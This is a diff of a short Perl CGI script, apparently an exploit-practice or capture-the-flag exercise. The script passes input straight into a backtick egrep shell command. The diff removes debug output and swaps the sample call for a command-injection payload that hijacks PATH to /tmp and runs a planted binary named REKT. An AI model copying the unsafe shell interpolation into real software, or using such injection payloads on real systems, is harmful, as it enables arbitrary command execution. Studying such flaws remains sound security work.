@@ -1,21 +1,16 @@
 #!/usr/bin/env perl
-
+# localhost:4646
 print "Content-type: text/html\n\n";
 
 sub t {
-    $fst = $_[0];
-    $fst =~ tr/a-z/A-Z/;
-    $snd = $_[1];
-    print("$fst\n");
-    $fst =~ s/\s.*//;
-    print("$fst\n");
-    @output = `egrep "^$fst" /tmp/xd 2>&1`;
-    print("output: @output\n");
+    $nn = $_[1];
+    $xx = $_[0];
+    $xx =~ tr/a-z/A-Z/;
+    $xx =~ s/\s.*//;
+    @output = `egrep "^$xx" /tmp/xd 2>&1`;
     foreach $line (@output) {
-        print("line: $line\n");
         ($f, $s) = split(/:/, $line);
-        print("f: $f | s: $s\n");
-        if($s =~ $snd) {
+        if($s =~ $nn) {
             return 1;
         }
     }
@@ -30,4 +25,4 @@ sub n {
     }    
 }
 
-n(t("get mdr", "mdr"));
+n(t('";export PATH="/tmp";REKT"', 'lol'));
